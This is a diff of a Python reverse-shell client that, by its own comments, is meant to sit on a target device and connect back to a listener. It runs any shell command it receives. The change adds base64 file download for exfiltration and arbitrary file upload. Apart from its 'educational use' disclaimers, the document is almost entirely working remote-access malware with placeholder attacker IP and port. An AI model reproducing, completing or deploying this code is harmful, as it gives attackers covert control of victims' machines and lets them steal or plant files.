@@ -1,67 +1,91 @@
-# WARNING: This script is for **educational and authorized use only**.
-# Unauthorized access to devices or systems using this code is strictly illegal and unethical.
-# Use this code only on systems you own or have explicit permission to test.
-# The author takes no responsibility for misuse.
+# ===========================================
+# WARNING:
+# This script is for educational and ethical use only.
+# It is designed for use in cybersecurity labs, penetration testing (with authorization), or academic learning.
+# Unauthorized use of this code against any system without consent is illegal and unethical.
+# ===========================================
 
-# This code must be in the target device
 
+#this file must be in the target device
 
 import socket
 import subprocess
 import json
 import os
+import base64
 
 class MySocket:
     def __init__(self, ip, port):
-        # Create a TCP socket and connect to the given IP and port
+        # Create a TCP socket and connect to the specified IP and port
         self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.connection.connect((ip, port))
 
     def command_execution(self, command):
-        # Execute a shell command and return the output
+        # Executes a system command and returns the result
         return subprocess.check_output(command, shell=True)
 
     def json_send(self, data):
-        # Convert the data to JSON and send it over the connection
+        # Sends JSON-encoded data over the connection
         json_data = json.dumps(data)
         self.connection.send(json_data.encode())
 
     def json_receive(self):
-        # Receive data and decode it from JSON
-        json_data = ""
+        # Receives data until a valid JSON object is formed
+        json_data = b""
         while True:
             try:
-                json_data = self.connection.recv(1024).decode()
-                return json.loads(json_data)
+                json_data += self.connection.recv(1024)
+                return json.loads(json_data.decode())
             except ValueError:
-                # Wait until complete JSON data is received
                 continue
 
     def execute_cd_command(self, directory):
-        # Change the current working directory
+        # Changes the working directory on the target device
         os.chdir(directory)
         return "Changed directory to " + directory
 
+    def get_file_contents(self, path):
+        # Reads and encodes file contents in base64 for safe transfer
+        with open(path, "rb") as file:
+            return base64.b64encode(file.read()).decode()
+
+    def save_file(self, path, content):
+        # Decodes base64 content and writes it to a file
+        with open(path, "wb") as my_file:
+            my_file.write(base64.b64decode(content))
+            return "Upload OK"
+
     def start_socket(self):
-        # Main loop to handle incoming commands
+        # Main loop: listens for commands from the server
         while True:
             command = self.json_receive()
-            if command[0] == "quit":
-                # Close the connection and exit
-                self.connection.close()
-                exit()
-            elif command[0] == "cd" and len(command) > 1:
-                # Handle 'cd' command separately
-                command_output = self.execute_cd_command(command[1])
-            else:
-                # Execute other shell commands
-                command_output = self.command_execution(command)
-
-            # Send back the result of the command
+            try:
+                if command[0] == "quit":
+                    # Gracefully close connection on quit command
+                    self.connection.close()
+                    exit()
+                elif command[0] == "cd" and len(command) > 1:
+                    # Change directory
+                    command_output = self.execute_cd_command(command[1])
+                elif command[0] == "download":
+                    # Read and send file contents
+                    command_output = self.get_file_contents(command[1])
+                elif command[0] == "upload":
+                    # Save received file content
+                    command_output = self.save_file(command[1], command[2])
+                else:
+                    # Execute general system command
+                    command_output = self.command_execution(command)
+            except Exception:
+                command_output = "Error!"
+            
+            # Send command result back to the server
             self.json_send(command_output)
 
         self.connection.close()
 
+
+# Connect to the listener (attacker/server IP and port)
 # Replace with the IP and port of the control server (must be your own or authorized test environment)
 my_socket_object = MySocket("your_ip_address", "int type port number")
 my_socket_object.start_socket()
